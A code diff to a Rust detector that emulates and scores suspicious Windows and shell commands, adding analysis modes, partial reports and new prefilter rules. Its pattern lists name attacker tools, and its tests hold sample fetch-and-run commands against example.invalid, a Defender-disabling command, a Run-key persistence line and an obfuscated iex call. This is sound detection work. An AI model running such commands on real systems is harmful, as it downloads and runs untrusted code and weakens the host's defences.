@@ -1,7 +1,7 @@
 use aho_corasick::{AhoCorasick, AhoCorasickBuilder};
 use emulator_core::{
     sha256_hex, AnalysisLimits, Artifact, EventKind, HostSnapshot, Ioc, NetworkActivity,
-    NetworkPolicy, TraceEvent, VirtualFileSnapshot,
+    NetworkPolicy, TraceEvent, VirtualDirectorySnapshot, VirtualFileSnapshot,
 };
 use runbox_emulator::{Runbox, RunboxError, RunboxInput};
 use serde::{Deserialize, Serialize};
@@ -10,7 +10,7 @@ use std::sync::LazyLock;
 use thiserror::Error;
 use url::Url;
 
-pub const REPORT_SCHEMA_VERSION: &str = "1";
+pub const REPORT_SCHEMA_VERSION: &str = "2";
 pub const MAX_DETECTOR_INPUT_BYTES: usize = 1024 * 1024;
 pub const DEFAULT_SAFE_SOURCE_URLS: &[&str] = &["https://gh.io/copilot-install"];
 
@@ -217,6 +217,8 @@ pub struct InputSummary {
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct AnalysisReport {
     pub schema_version: String,
+    pub analysis_mode: AnalysisMode,
+    pub analysis_status: AnalysisStatus,
     pub input: InputSummary,
     pub verdict: Verdict,
     pub risk: RiskAssessment,
@@ -226,11 +228,28 @@ pub struct AnalysisReport {
     pub iocs: Vec<Ioc>,
     pub artifacts: Vec<Artifact>,
     pub virtual_files: Vec<VirtualFileSnapshot>,
+    pub virtual_directories: Vec<VirtualDirectorySnapshot>,
     pub network_urls: Vec<String>,
     pub network_activity: Vec<NetworkActivity>,
     pub safe_network_urls: Vec<String>,
     pub warnings: Vec<String>,
+    pub steps_used: usize,
     pub prefilter: PrefilterResult,
+}
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
+#[serde(rename_all = "snake_case")]
+pub enum AnalysisMode {
+    HotPath,
+    Thorough,
+}
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
+#[serde(rename_all = "snake_case")]
+pub enum AnalysisStatus {
+    PrefilterOnly,
+    Emulated,
+    Partial,
 }
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
@@ -291,6 +310,16 @@ const PREFILTER_PATTERNS: &[(&str, PrefilterSignal)] = &[
     ("cmdkey", PrefilterSignal::NativeLauncher),
     ("wmic", PrefilterSignal::NativeLauncher),
     ("for /f", PrefilterSignal::NativeLauncher),
+    ("forfiles", PrefilterSignal::NativeLauncher),
+    ("cmstp", PrefilterSignal::NativeLauncher),
+    ("msbuild", PrefilterSignal::NativeLauncher),
+    ("installutil", PrefilterSignal::NativeLauncher),
+    ("reg add", PrefilterSignal::NativeLauncher),
+    ("reg.exe", PrefilterSignal::NativeLauncher),
+    ("sc create", PrefilterSignal::NativeLauncher),
+    ("sc.exe", PrefilterSignal::NativeLauncher),
+    ("makecab", PrefilterSignal::NativeLauncher),
+    ("extrac32", PrefilterSignal::NativeLauncher),
     ("invoke-webrequest", PrefilterSignal::PowerShellSyntax),
     ("invoke-restmethod", PrefilterSignal::PowerShellSyntax),
     ("invoke-expression", PrefilterSignal::PowerShellSyntax),
@@ -310,6 +339,17 @@ const PREFILTER_PATTERNS: &[(&str, PrefilterSignal)] = &[
     ("[text.", PrefilterSignal::PowerShellSyntax),
     ("downloadfile", PrefilterSignal::PowerShellSyntax),
     ("downloadstring", PrefilterSignal::PowerShellSyntax),
+    ("start-bitstransfer", PrefilterSignal::PowerShellSyntax),
+    ("start-process", PrefilterSignal::PowerShellSyntax),
+    ("set-itemproperty", PrefilterSignal::PowerShellSyntax),
+    ("new-itemproperty", PrefilterSignal::PowerShellSyntax),
+    ("set-mppreference", PrefilterSignal::PowerShellSyntax),
+    ("add-mppreference", PrefilterSignal::PowerShellSyntax),
+    ("register-scheduledtask", PrefilterSignal::PowerShellSyntax),
+    ("new-scheduledtask", PrefilterSignal::PowerShellSyntax),
+    ("set-netfirewall", PrefilterSignal::PowerShellSyntax),
+    ("add-type", PrefilterSignal::PowerShellSyntax),
+    ("reflection.assembly", PrefilterSignal::PowerShellSyntax),
     ("curl", PrefilterSignal::NetworkTool),
     ("wget", PrefilterSignal::NetworkTool),
     ("bitsadmin", PrefilterSignal::NetworkTool),
@@ -335,6 +375,11 @@ const PREFILTER_PATTERNS: &[(&str, PrefilterSignal)] = &[
     (".vbs", PrefilterSignal::ExecutableOrScript),
     (".js", PrefilterSignal::ExecutableOrScript),
     (".sct", PrefilterSignal::ExecutableOrScript),
+    (".cpl", PrefilterSignal::ExecutableOrScript),
+    (".wsf", PrefilterSignal::ExecutableOrScript),
+    (".jse", PrefilterSignal::ExecutableOrScript),
+    (".vbe", PrefilterSignal::ExecutableOrScript),
+    ("\\currentversion\\run", PrefilterSignal::ExecutableOrScript),
     ("shell:startup", PrefilterSignal::ExecutableOrScript),
     (
         "start menu\\programs\\startup",
@@ -460,13 +505,18 @@ impl Detector {
                 signals: Vec::new(),
             };
         }
-        let mut signals = PREFILTER_MATCHER
-            .find_iter(content)
-            .map(|matched| PREFILTER_PATTERNS[matched.pattern().as_usize()].1)
-            .collect::<BTreeSet<_>>();
-        if contains_long_base64_token(content.as_bytes()) {
-            signals.insert(PrefilterSignal::EncodingOrObfuscation);
+        let mut matched_signals = [false; 8];
+        for matched in PREFILTER_MATCHER.find_iter(content) {
+            let signal = PREFILTER_PATTERNS[matched.pattern().as_usize()].1;
+            matched_signals[signal as usize] = true;
         }
+        if contains_long_base64_token(content.as_bytes()) {
+            matched_signals[PrefilterSignal::EncodingOrObfuscation as usize] = true;
+        }
+        if contains_powershell_call_syntax(content.as_bytes()) {
+            matched_signals[PrefilterSignal::PowerShellSyntax as usize] = true;
+        }
+        let signals = prefilter_signals(matched_signals);
         let only_contextual = signals.iter().all(|signal| {
             matches!(
                 signal,
@@ -483,7 +533,28 @@ impl Detector {
         PrefilterResult {
             decision,
             input_bytes: content.len(),
-            signals: signals.into_iter().collect(),
+            signals,
+        }
+    }
+
+    #[must_use]
+    pub fn infer_input_kind(content: &str) -> InputKind {
+        if Self::prefilter(content).decision == PrefilterDecision::DefinitelyBenign {
+            return InputKind::RawCommand;
+        }
+        let lowercase = content.to_ascii_lowercase();
+        if content.contains('\n')
+            || content.trim_start().starts_with('$')
+            || lowercase.contains("invoke-webrequest")
+            || lowercase.contains("invoke-restmethod")
+            || lowercase.contains("invoke-expression")
+            || lowercase.contains("set-content")
+            || lowercase.contains("[system.")
+            || lowercase.contains("[text.")
+        {
+            InputKind::PowerShellScript
+        } else {
+            InputKind::RawCommand
         }
     }
 
@@ -491,20 +562,44 @@ impl Detector {
     ///
     /// # Errors
     ///
-    /// Returns an error when the runbox or one of its nested emulators cannot
-    /// complete the analysis.
+    /// Returns an error when the detector input exceeds its configured limit.
     pub fn analyze(&self, input: DetectorInput) -> Result<AnalysisReport, DetectorError> {
+        self.analyze_with_mode(input, AnalysisMode::HotPath)
+    }
+
+    /// Analyze an input without allowing the prefilter to skip emulation.
+    ///
+    /// # Errors
+    ///
+    /// Returns an error when the detector input exceeds its configured limit.
+    pub fn analyze_full(&self, input: DetectorInput) -> Result<AnalysisReport, DetectorError> {
+        self.analyze_with_mode(input, AnalysisMode::Thorough)
+    }
+
+    /// Analyze an input using the selected performance mode.
+    ///
+    /// # Errors
+    ///
+    /// Returns an error when the detector input exceeds its configured limit.
+    pub fn analyze_with_mode(
+        &self,
+        input: DetectorInput,
+        mode: AnalysisMode,
+    ) -> Result<AnalysisReport, DetectorError> {
         let DetectorInput { kind, content } = input;
         let prefilter = Self::prefilter(&content);
         if prefilter.decision == PrefilterDecision::Oversized {
             return Err(DetectorError::InputTooLarge);
         }
         let input_kind = input_kind_name(kind);
-        if prefilter.decision == PrefilterDecision::DefinitelyBenign {
+        if mode == AnalysisMode::HotPath
+            && prefilter.decision == PrefilterDecision::DefinitelyBenign
+        {
             return Ok(prefilter_benign_report(
                 input_kind,
                 content.len(),
                 prefilter,
+                mode,
             ));
         }
         let input_summary = summarize_candidate_input(input_kind, content.as_bytes());
@@ -515,8 +610,20 @@ impl Detector {
         let result = runbox.emulate(match kind {
             InputKind::RawCommand => RunboxInput::RawCommand(content.clone()),
             InputKind::PowerShellScript => RunboxInput::PowerShellScript(content.clone()),
-        })?;
-        let snapshot = result.snapshot;
+        });
+        let (analysis_status, snapshot) = match result {
+            Ok(result) => (AnalysisStatus::Emulated, result.snapshot),
+            Err(error) => {
+                let mut snapshot = runbox.host().snapshot();
+                let warning = format!("analysis ended early: {error}");
+                if snapshot.warnings.len() < self.limits.max_warnings
+                    && !snapshot.warnings.contains(&warning)
+                {
+                    snapshot.warnings.push(warning);
+                }
+                (AnalysisStatus::Partial, snapshot)
+            }
+        };
         let findings = evaluate_rules(&content, &snapshot, &self.safe_sources);
         let risk = assess_risk(&findings);
         let verdict = verdict_for_score(risk.score);
@@ -524,21 +631,25 @@ impl Detector {
         let network_urls = snapshot
             .network_activity
             .iter()
-            .map(|activity| activity.url.clone())
+            .flat_map(network_activity_urls)
+            .map(str::to_owned)
             .collect::<BTreeSet<_>>()
             .into_iter()
             .collect();
         let safe_network_urls = snapshot
             .network_activity
             .iter()
-            .filter(|activity| self.safe_sources.is_safe(&activity.url))
-            .map(|activity| activity.url.clone())
+            .flat_map(network_activity_urls)
+            .filter(|url| self.safe_sources.is_safe(url))
+            .map(str::to_owned)
             .collect::<BTreeSet<_>>()
             .into_iter()
             .collect();
 
         Ok(AnalysisReport {
             schema_version: REPORT_SCHEMA_VERSION.into(),
+            analysis_mode: mode,
+            analysis_status,
             input: input_summary,
             verdict,
             risk,
@@ -548,13 +659,44 @@ impl Detector {
             iocs: snapshot.iocs,
             artifacts: snapshot.artifacts,
             virtual_files: snapshot.virtual_files,
+            virtual_directories: snapshot.virtual_directories,
             network_urls,
             network_activity: snapshot.network_activity,
             safe_network_urls,
             warnings: snapshot.warnings,
+            steps_used: snapshot.steps_used,
             prefilter,
         })
     }
+}
+
+fn network_activity_urls(activity: &NetworkActivity) -> impl Iterator<Item = &str> {
+    std::iter::once(activity.url.as_str())
+        .chain(activity.redirect_urls.iter().map(String::as_str))
+        .chain(activity.final_url.iter().map(String::as_str))
+}
+
+fn prefilter_signals(matched: [bool; 8]) -> Vec<PrefilterSignal> {
+    const SIGNALS: [PrefilterSignal; 8] = [
+        PrefilterSignal::CommandInterpreter,
+        PrefilterSignal::NativeLauncher,
+        PrefilterSignal::PowerShellSyntax,
+        PrefilterSignal::NetworkTool,
+        PrefilterSignal::NetworkLocator,
+        PrefilterSignal::ShellSyntax,
+        PrefilterSignal::ExecutableOrScript,
+        PrefilterSignal::EncodingOrObfuscation,
+    ];
+    SIGNALS
+        .into_iter()
+        .filter(|signal| matched[*signal as usize])
+        .collect()
+}
+
+fn contains_powershell_call_syntax(input: &[u8]) -> bool {
+    input
+        .windows(2)
+        .any(|window| window[0] == b'&' && matches!(window[1], b'(' | b'\'' | b'"' | b'$'))
 }
 
 fn contains_long_base64_token(input: &[u8]) -> bool {
@@ -579,9 +721,16 @@ const fn input_kind_name(kind: InputKind) -> &'static str {
     }
 }
 
-fn prefilter_benign_report(kind: &str, size: usize, prefilter: PrefilterResult) -> AnalysisReport {
+fn prefilter_benign_report(
+    kind: &str,
+    size: usize,
+    prefilter: PrefilterResult,
+    mode: AnalysisMode,
+) -> AnalysisReport {
     AnalysisReport {
         schema_version: REPORT_SCHEMA_VERSION.into(),
+        analysis_mode: mode,
+        analysis_status: AnalysisStatus::PrefilterOnly,
         input: InputSummary {
             kind: kind.into(),
             size,
@@ -594,7 +743,7 @@ fn prefilter_benign_report(kind: &str, size: usize, prefilter: PrefilterResult) 
         },
         confidence: Confidence {
             score: 100,
-            completeness: 1.0,
+            completeness: 0.0,
             unsupported_operations: 0,
             limits_reached: 0,
         },
@@ -603,10 +752,12 @@ fn prefilter_benign_report(kind: &str, size: usize, prefilter: PrefilterResult) 
         iocs: Vec::new(),
         artifacts: Vec::new(),
         virtual_files: Vec::new(),
+        virtual_directories: Vec::new(),
         network_urls: Vec::new(),
         network_activity: Vec::new(),
         safe_network_urls: Vec::new(),
         warnings: Vec::new(),
+        steps_used: 0,
         prefilter,
     }
 }
@@ -615,8 +766,10 @@ fn prefilter_benign_report(kind: &str, size: usize, prefilter: PrefilterResult) 
 pub fn render_human(report: &AnalysisReport) -> String {
     let mut output = String::new();
     output.push_str(&format!(
-        "Verdict: {:?}\nRisk: {} / 100 ({:?})\nConfidence: {} / 100 ({:.0}% complete)\n",
+        "Verdict: {:?}\nAnalysis: {:?} ({:?})\nRisk: {} / 100 ({:?})\nConfidence: {} / 100 ({:.0}% complete)\n",
         report.verdict,
+        report.analysis_status,
+        report.analysis_mode,
         report.risk.score,
         report.risk.level,
         report.confidence.score,
@@ -630,7 +783,7 @@ pub fn render_human(report: &AnalysisReport) -> String {
         report.virtual_files.len()
     ));
     if report.prefilter.decision == PrefilterDecision::DefinitelyBenign {
-        output.push_str("Prefilter: definitely benign; hashing and emulation skipped\n");
+        output.push_str("Prefilter: no known signals; hashing and emulation skipped\n");
     }
 
     if !report.findings.is_empty() {
@@ -708,14 +861,20 @@ fn evaluate_rules(
     let safe_urls = snapshot
         .network_activity
         .iter()
-        .filter(|activity| safe_sources.is_safe(&activity.url))
-        .map(|activity| activity.url.clone())
+        .flat_map(network_activity_urls)
+        .filter(|url| safe_sources.is_safe(url))
+        .map(str::to_owned)
         .collect::<BTreeSet<_>>();
     let all_network_sources_safe = !snapshot.network_activity.is_empty()
         && snapshot
             .network_activity
             .iter()
-            .all(|activity| safe_sources.is_safe(&activity.url));
+            .flat_map(network_activity_urls)
+            .all(|url| safe_sources.is_safe(url));
+    let trusted_remote_msi = all_network_sources_safe
+        && safe_source_segment_matches(input, &safe_urls, &["msiexec"], &[]);
+    let trusted_remote_script_host = all_network_sources_safe
+        && safe_source_segment_matches(input, &safe_urls, &["mshta", "wscript", "cscript"], &[]);
     if !safe_urls.is_empty() {
         findings.push(Finding {
             rule_id: "source.safe-network".into(),
@@ -812,7 +971,7 @@ fn evaluate_rules(
             evidence: vec!["input combines a DLL launcher with a UNC path".into()],
         });
     }
-    if !all_network_sources_safe
+    if !trusted_remote_msi
         && lowercase.contains("msiexec")
         && (lowercase.contains("http://")
             || lowercase.contains("https://")
@@ -849,7 +1008,7 @@ fn evaluate_rules(
             evidence: vec!["input combines conhost --headless with a command interpreter".into()],
         });
     }
-    if !all_network_sources_safe
+    if !trusted_remote_script_host
         && contains_any(&lowercase, &["mshta", "wscript", "cscript"])
         && contains_any(&lowercase, &["http://", "https://", "hxxp"])
     {
@@ -899,7 +1058,9 @@ fn evaluate_rules(
     let has_download = contains_any(&lowercase, &downloads);
     let has_execution = contains_any(&lowercase, &executions);
     let has_extraction = contains_any(&lowercase, &["expand-archive", "tar.exe", " tar "]);
-    if !all_network_sources_safe && has_download && has_extraction && has_execution {
+    let trusted_download_execution = all_network_sources_safe
+        && safe_source_segment_matches(input, &safe_urls, &downloads, &executions);
+    if !trusted_download_execution && has_download && has_extraction && has_execution {
         findings.push(Finding {
             rule_id: "chain.download-extract-execute".into(),
             title: "Payload downloads, extracts, and executes staged content".into(),
@@ -909,7 +1070,7 @@ fn evaluate_rules(
                 "input contains download, archive extraction, and execution stages".into(),
             ],
         });
-    } else if !all_network_sources_safe && has_download && has_execution {
+    } else if !trusted_download_execution && has_download && has_execution {
         findings.push(Finding {
             rule_id: "chain.download-execute".into(),
             title: "Payload combines remote retrieval with subsequent execution".into(),
@@ -927,7 +1088,7 @@ fn evaluate_rules(
             score: 5,
             evidence: network_evidence,
         });
-        if !all_network_sources_safe
+        if !trusted_download_execution
             && contains_any(&lowercase, &["-encodedcommand", " -enc ", " -e "])
         {
             findings.push(Finding {
@@ -987,7 +1148,7 @@ fn evaluate_rules(
     }
 
     let execution_chain_evidence = download_write_execute_evidence(snapshot);
-    if !all_network_sources_safe && !execution_chain_evidence.is_empty() {
+    if !trusted_download_execution && !execution_chain_evidence.is_empty() {
         if let Some(finding) = findings.iter_mut().find(|finding| {
             matches!(
                 finding.rule_id.as_str(),
@@ -1012,7 +1173,7 @@ fn evaluate_rules(
             .to_ascii_lowercase()
             .contains("invoke-expression")
     });
-    if let Some(event) = invoke_expression.filter(|_| !all_network_sources_safe) {
+    if let Some(event) = invoke_expression.filter(|_| !trusted_download_execution) {
         findings.push(Finding {
             rule_id: "powershell.dynamic-execution".into(),
             title: "Dynamically constructed PowerShell was executed".into(),
@@ -1043,6 +1204,23 @@ fn evaluate_rules(
     }
 
     findings
+}
+
+fn safe_source_segment_matches(
+    input: &str,
+    safe_urls: &BTreeSet<String>,
+    first_group: &[&str],
+    second_group: &[&str],
+) -> bool {
+    input.split([';', '\n', '\r']).any(|segment| {
+        let lowercase = segment.to_ascii_lowercase();
+        let has_safe_url = safe_urls
+            .iter()
+            .any(|url| lowercase.contains(&url.to_ascii_lowercase()));
+        has_safe_url
+            && (first_group.is_empty() || contains_any(&lowercase, first_group))
+            && (second_group.is_empty() || contains_any(&lowercase, second_group))
+    })
 }
 
 fn add_text_rule(
@@ -1259,6 +1437,47 @@ mod tests {
 
         assert_eq!(report.verdict, Verdict::Benign);
         assert_eq!(report.risk.score, 0);
+        assert_eq!(report.analysis_status, AnalysisStatus::PrefilterOnly);
+    }
+
+    #[test]
+    fn thorough_mode_emulates_inputs_skipped_by_the_hot_path() {
+        let detector = Detector::default();
+        let hot_path = detector
+            .analyze(DetectorInput::raw_command("Meeting notes for Friday"))
+            .unwrap();
+        let thorough = detector
+            .analyze_full(DetectorInput::raw_command("Meeting notes for Friday"))
+            .unwrap();
+
+        assert_eq!(hot_path.analysis_status, AnalysisStatus::PrefilterOnly);
+        assert!(hot_path.input.sha256.is_none());
+        assert_eq!(thorough.analysis_status, AnalysisStatus::Emulated);
+        assert!(thorough.input.sha256.is_some());
+        assert!(!thorough.trace.is_empty());
+    }
+
+    #[test]
+    fn emulation_errors_produce_partial_reports() {
+        let detector = Detector::new(AnalysisLimits {
+            max_steps: 0,
+            ..AnalysisLimits::default()
+        });
+        let report = detector
+            .analyze_full(DetectorInput::powershell_script(
+                "Invoke-WebRequest https://example.invalid/payload",
+            ))
+            .unwrap();
+
+        assert_eq!(report.analysis_status, AnalysisStatus::Partial);
+        assert!(report
+            .warnings
+            .iter()
+            .any(|warning| warning.contains("analysis ended early")));
+        assert!(report
+            .findings
+            .iter()
+            .any(|finding| finding.rule_id == "powershell.download-cradle"));
     }
 
     #[test]
@@ -1375,6 +1594,19 @@ mod tests {
     }
 
     #[test]
+    fn safe_network_activity_does_not_suppress_unrelated_dynamic_execution() {
+        let payload = "iex 'Write-Output local'; Invoke-RestMethod 'https://gh.io/copilot-install'";
+        let report = Detector::default()
+            .analyze(DetectorInput::powershell_script(payload))
+            .unwrap();
+
+        assert!(report
+            .findings
+            .iter()
+            .any(|finding| finding.rule_id == "powershell.dynamic-execution"));
+    }
+
+    #[test]
     fn safe_source_matching_rejects_lookalikes_and_mixed_sources() {
         let lookalike = Detector::default()
             .analyze(DetectorInput::raw_command(
@@ -1439,6 +1671,10 @@ mod tests {
             "powershell.exe -EncodedCommand QQ==",
             "curl https://example.invalid/a | bash",
             r"rundll32.exe \\example.invalid\share\stage.dll,Start",
+            "Set-MpPreference -DisableRealtimeMonitoring $true",
+            r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /d payload",
+            "msbuild payload.xml",
+            "&('i'+'ex') 'Write-Output test'",
         ] {
             assert_eq!(
                 Detector::prefilter(content).decision,
@@ -1450,6 +1686,25 @@ mod tests {
             Detector::prefilter(&"A".repeat(160)).decision,
             PrefilterDecision::Candidate
         );
+    }
+
+    #[test]
+    fn prefilter_differentially_covers_known_non_benign_inputs() {
+        let cases = [
+            DetectorInput::raw_command("mshta https://example.invalid/fix"),
+            DetectorInput::raw_command("curl https://example.invalid/payload | bash"),
+            DetectorInput::raw_command("msiexec /i https://example.invalid/package.msi /quiet"),
+            DetectorInput::powershell_script(
+                "iex (Invoke-RestMethod 'https://example.invalid/stage')",
+            ),
+        ];
+
+        for input in cases {
+            let prefilter = Detector::prefilter(&input.content);
+            let report = Detector::default().analyze_full(input).unwrap();
+            assert_ne!(report.verdict, Verdict::Benign);
+            assert_eq!(prefilter.decision, PrefilterDecision::Candidate);
+        }
     }
 
     #[test]
